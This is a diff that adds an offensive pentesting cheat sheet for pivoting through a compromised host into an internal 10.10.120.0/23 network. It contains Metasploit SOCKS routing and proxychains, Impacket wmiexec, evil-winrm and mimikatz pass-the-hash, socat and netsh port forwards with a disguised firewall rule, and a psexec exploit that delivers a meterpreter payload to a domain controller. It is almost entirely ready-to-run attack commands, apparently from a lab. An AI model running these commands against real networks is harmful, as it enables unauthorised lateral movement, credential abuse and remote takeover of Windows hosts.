@@ -1,0 +1,63 @@
+#SOCKS Proxies
+ use auxiliary/server/socks4a
+ route add 10.10.120.0/23 1
+ /etc/proxychains.conf 
+ socks4 127.0.0.1 1080
+ 
+ with proxy no ICMP(pings) no (SYN)
+
+#Impacket
+proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes 
+proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
+
+#Windows
+sudo proxychains socat TCP4-Listen:445,fork TCP:10.10.120.1:445
+mimikatz # privilege :: debug 
+mimikatz # sekurlsa::pth /user: /domain: /ntlm:REDACTED
+
+sudo proxychains socat TCP4-Listen:5985,fork TCP:10.10.120.1:5985
+sekurlsa::pth /user:user /domain:domain /ntlm:REDACTED /run:powershell
+PS C:\Windows\system32> Enter-PSSession -ComputerName ip
+PS C:\Users\user\Documents> hostname; whoami 
+dc-1 
+domain\user
+
+PowerShell Remoting:
+udo proxychains socat TCP4-Listen:5985,fork TCP:10.10.120.1:5985
+
+#proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
+
+METASPLOIT
+msfconsole -q
+setg Proxies socks4:127.0.0.1:1080
+
+#Reverse Port Forwards
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x
+netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allow protocol=TCP localport=8080
+Metasploit
+sessions 1
+portfwd add -R -p 8080 -l 80 -L ip
+
+#metasploit
+setg Proxies socks4:127.0.0.1:1080
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.120.1
+msf6 auxiliary(scanner/smb/smb_version) > run
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.120.1
+msf6 exploit(windows/smb/psexec) > set SMBDomain CYBER
+msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass REDACTED
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
+msf6 exploit(windows/smb/psexec) > exploit
+
+
+
+
+
+
+
+
+
+
+
